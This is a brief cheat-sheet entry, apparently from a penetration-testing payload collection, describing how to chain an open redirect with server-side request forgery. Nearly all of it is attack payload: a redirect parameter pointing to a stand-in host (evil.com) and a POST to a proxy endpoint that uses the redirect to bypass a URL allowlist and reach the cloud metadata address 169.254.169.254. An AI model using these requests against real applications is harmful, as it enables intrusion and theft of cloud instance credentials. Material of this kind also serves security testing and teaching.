# Open Redirect to SSRF

## Summary
Chain open redirect with SSRF.

## Technique
```
# App has open redirect:
/redirect?url=https://evil.com

# Use it to bypass URL allowlist:
POST /api/proxy
url=/redirect?url=http://169.254.169.254/latest/meta-data/
```
